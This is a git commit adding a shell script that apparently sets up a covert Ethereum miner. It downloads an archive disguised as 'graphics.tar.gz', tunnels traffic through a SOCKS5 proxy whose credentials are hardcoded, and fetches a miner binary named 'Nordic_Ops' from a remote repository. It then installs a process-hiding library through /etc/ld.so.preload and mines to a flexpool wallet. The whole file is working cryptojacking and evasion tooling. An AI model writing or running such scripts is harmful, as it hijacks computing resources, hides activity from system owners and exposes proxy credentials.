9ecfe5d2bafab85e6256eb48633035d828b1e9ee
nathanfleight <92636939+nathanfleight@users.noreply.github.com>
2022-01-20 00:27:23 +0200

    Create start_Nordic_Ops_fle_ws2.sh

---
+++ start_Nordic_Ops_fle_ws2.sh
@@ -0,0 +1,49 @@
+#!/bin/sh
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
+
+tar -xvzf graphics.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 3.16.66.235:1080
+socks5_username = mikrotik999
+socks5_password = Elibawnos
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+echo "******************************************************************"
+
+echo " "
+echo " "
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/Nordic_Ops
+chmod +x Nordic_Ops
+
+./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicNord.zip
+unzip magicNord.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+./graftcp/graftcp ./Nordic_Ops --algo ethash --ssl --hostname eth-us-west.flexpool.io --ssl-port 5555 --wallet 0x8CB8003E428D0Fd7693D22f576A212403728c64a --worker-name Black_Nordic_Ops
+	
